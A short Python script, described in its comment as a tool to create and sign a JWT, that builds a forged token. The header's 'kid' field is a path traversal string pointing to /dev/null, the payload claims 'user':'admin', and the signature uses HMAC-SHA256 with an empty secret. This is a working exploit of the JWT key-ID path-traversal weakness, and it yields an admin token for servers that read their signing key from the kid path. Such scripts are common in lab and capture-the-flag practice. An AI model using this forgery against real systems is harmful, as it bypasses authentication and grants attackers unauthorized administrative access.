#!/usr/bin/python3

#JWT - Tool to create and sign a JWT based on a key or file.

import base64
import hmac
import hashlib
import json

#pub = open("public.pem")
#pub2 = pub.read()
key = "key"

header = {"typ":"JWT","alg":"HS256","kid":"../../../../../../../../../../dev/null"}
payload = {"user":"admin"}

#token = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6Ii4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uL2Rldi9udWxsIn0.eyJ1c2VyIjoiYWRtaW4ifQ"

token = base64.urlsafe_b64encode(bytes(json.dumps(header),encoding='utf8')).decode('utf8').rstrip("=") + "." + base64.urlsafe_b64encode(bytes(json.dumps(payload),encoding='utf8')).decode('utf8').rstrip("=")


secret = ""

signature = base64.urlsafe_b64encode(hmac.new(bytes(secret, encoding='utf8'),token.encode('utf8'), hashlib.sha256).digest()).decode('utf8').rstrip('=')


print(token+ '.' + signature)



#pub.close()
